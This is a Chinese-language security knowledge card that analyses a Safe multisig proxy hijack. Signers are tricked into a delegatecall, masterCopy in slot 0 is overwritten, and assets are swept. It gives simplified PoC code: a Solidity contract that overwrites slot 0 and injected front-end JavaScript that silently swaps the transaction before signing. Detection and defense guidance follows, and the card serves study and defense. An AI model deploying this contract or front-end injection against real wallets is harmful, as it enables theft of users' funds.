---
id: blockchain-wallet-safe-delegatecall-slot0-mastercopy-hijack
title: Safe 多签代理 delegatecall 存储槽劫持：篡改 operation=1 + sstore(0) 替换 masterCopy 后 sweep 资产
type: scenario
domain: blockchain
path: blockchain/wallet
technique: safe-proxy-delegatecall-mastercopy-slot-overwrite
aliases:
- Safe 多签被击穿
- Gnosis Safe delegatecall 攻击
- masterCopy 槽覆盖
- operation 参数篡改
- 前端供应链签名欺骗
tags:
- blockchain
- ethereum
- safe
- gnosis
- multisig
- delegatecall
- proxy
- storage-slot
- supply-chain
- wallet
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V138
  verified_at: '2026-11-06T05:37:07+08:00'
  notes: 已对照原文与7张截图核对：SafeProxy slot0 masterCopy、fallback sload(0)+delegatecall、operation 0/1、恶意 transfer() sstore(0, 0xbDd077...9516)、前端 signTransaction 前后替换/恢复、sweepETH/sweepERC20 与原文一致；已修正变体中 guard/fallbackHandler 槽位说明（原文简化图 Slot2/3 与标准 Safe 1.3.0 实际布局不符）。未验证点：原文未标注 Safe 版本区间，PoC 为简化片段，未做链上复现。
---

## 一句话结论

Safe（原 Gnosis Safe）多签钱包的 `execTransaction` 允许 `operation=1` 走 delegatecall；若签名者被前端供应链注入欺骗，签下 `to=恶意合约` 的 delegatecall 交易，恶意合约用 `sstore(0, attacker)` 在代理存储上下文中改写 Slot 0 的 `masterCopy`，即可永久接管钱包并调用 `sweepETH/sweepERC20` 转走全部资产。

## 原理

- Safe 采用代理模式：`SafeProxy` 自身不含业务逻辑，fallback 中 `let _masterCopy := sload(0)`，再把 calldata `delegatecall` 到 Slot 0 保存的实现合约地址。Slot 0 就是 `masterCopy`，改掉它等于替换整个钱包逻辑。
- `delegatecall` 在代理的存储上下文中执行被调代码，因此被调合约写 Slot 0 写的是**代理的** Slot 0，而不是它自己的存储。这是攻击的代码基础。
- Safe 实现合约的 `execTransaction` 有一个 `operation` 参数（`enum Operation { Call, DelegateCall }`）：`0` 为普通 `call`，`1` 为 `delegatecall`。正常转账用 `0`；把它改成 `1` 并把 `to` 指向攻击者合约，攻击者合约就能以 Safe 代理身份改写任意存储槽。
- 恶意合约把覆盖逻辑伪装成 `transfer(address,uint256)`（选择器 `0xa9059cbb`），内部执行 `assembly { sstore(0, <attacker>) }`。交易执行后 Safe 代理的 `masterCopy` 已指向攻击者合约，攻击者随后调用 `sweepETH()`、`sweepERC20()` 把资产转走。
- 链下部分：攻击者入侵 Safe{Wallet} 前端开发者设备，向 S3 托管的 JavaScript 注入恶意代码；代码只在检测到受害 Safe 地址与目标签名者地址时激活，在调用 `sdk.signTransaction()` 的瞬间把 `tx.to` 换成恶意合约、`tx.data` 换成 transfer 选择器、`tx.operation` 改为 `1`、`value` 置 0，签名完成后立即把 `tx`/`sig.data` 恢复原值。UI 展示的是普通转账，硬件钱包实际签的是 delegatecall 恶意 payload。
- 核心缺陷不是私钥或签名算法，而是“签名者看到/以为的内容”与“硬件钱包实际签署的 calldata”之间没有独立校验，即前端展示层与链上执行层的信任缺口。

## 触发条件

- 目标使用 Safe/Gnosis Safe 代理合约，且 `execTransaction` 未限制 `operation` 必须为 `0`（标准实现允许 `1`）。
- 多签签名者使用被篡改的前端（供应链/前端 JS 注入），且签名时依赖 UI 展示而不在硬件钱包上核对目标地址、operation 与 calldata。
- 攻击者能拿到达到 threshold 的签名（本例 threshold 为 3）；签名者对交易内容的语义没有独立验证。
- 恶意实现合约地址可部署，且钱包内资产可由攻击者合约的 sweep 函数转出。

## 利用步骤

1. 入侵 Safe{Wallet} 前端供应链（开发者设备/构建产物/S3 托管 JS），植入带上下文门控的恶意代码。
2. 恶意代码匹配受害 Safe 地址与签名者地址，在 `sdk.signTransaction()` 调用前替换交易：`to=恶意合约`、`data=0xa9059cbb...`、`operation=1`、`value=0`、`safeTxGas=45746`。
3. 收集达到 threshold 的签名；签名者 UI 上看到的是正常转账，硬件钱包签的是 delegatecall payload。
4. 提交并执行 `execTransaction`；恶意合约 `transfer()` 在代理存储上下文执行 `sstore(0, attacker)`，Slot 0 的 `masterCopy` 被替换。
5. 调用攻击者合约的 `sweepETH()`/`sweepERC20()` 转走 ETH 与 ERC-20 资产。

## PoC

```solidity
// 恶意实现合约（简化）：伪装成 ERC-20 transfer，实际覆盖代理 Slot 0
contract MaliciousImplementation {
    function transfer(address to, uint256 amount) external {
        assembly {
            sstore(0, 0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516)
        }
    }
}
```

```javascript
// 前端注入逻辑（简化）：仅对受害 Safe/签名者生效
if (isVictimSafe(tx.to) && isVictimSigner(currentSigner) && tx.data.operation === 0) {
    const orig = tx.data;
    tx.data.to = "0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516";
    tx.data.data = "0xa9059cbb...";   // ERC-20 transfer 选择器
    tx.data.operation = 1;            // Call -> DelegateCall
    tx.data.value = 0;
    tx.data.safeTxGas = 45746;
    const sig = await sdk.signTransaction(tx, safeVersion);
    sig.data = orig;                  // 签名后恢复，UI 无异常
    tx.data = orig;
    return sig;
}
```

## 变体与关联

- 变体：其他“代理 + 用户可选 operation”的钱包/模块（多签、模块化账户、插件账户）同样可能被 delegatecall 覆盖实现槽或 guard 槽。
- 变体：不改 `masterCopy`，改 `guard`（Safe 1.3.0 中为 Slot 9）或 `fallbackHandler`（Safe 1.3.0 使用专用 keccak 存储槽，非顺序槽）也能劫持后续交易校验/回退逻辑。原文配图为简化布局（Slot 2/3），与标准合约实际槽位不同，写入前应以目标版本的 storage layout 为准。
- 变体：不依赖前端注入，直接欺骗签名者签署 `operation=1` 的交易，或在多签工具/插件中替换待签数据。
- 关联：硬件钱包盲签、EIP-712 结构化数据展示、交易模拟与 intent verification 相关卡片。

## 检测与防御

- 签名端在硬件钱包/离线设备上完整核对 `to`、`value`、`operation`、`data` 与链 ID，拒绝盲签；对 `operation=1` 的 Safe 交易强制人工复核。
- Safe 使用方对普通转账要求 `operation=0`，通过 guard/模块限制 delegatecall 目标白名单；升级到支持交易模拟与 calldata 解码的签名流程。
- 前端供应链：SRI/构建产物签名、发布审批、S3 写权限最小化、监控 JS 变更；关键交易在独立渠道二次确认。
- 链上监控：监测 Safe 代理 Slot 0 变化、`execTransaction` 中 `operation=1` 的异常交易、masterCopy 指向新部署合约、随后调用 sweep 函数的行为。
- 事件响应：发现 masterCopy 被替换立即暂停签名、转移剩余资产、轮换前端与签名环境，并追踪 sweep 资金流向。
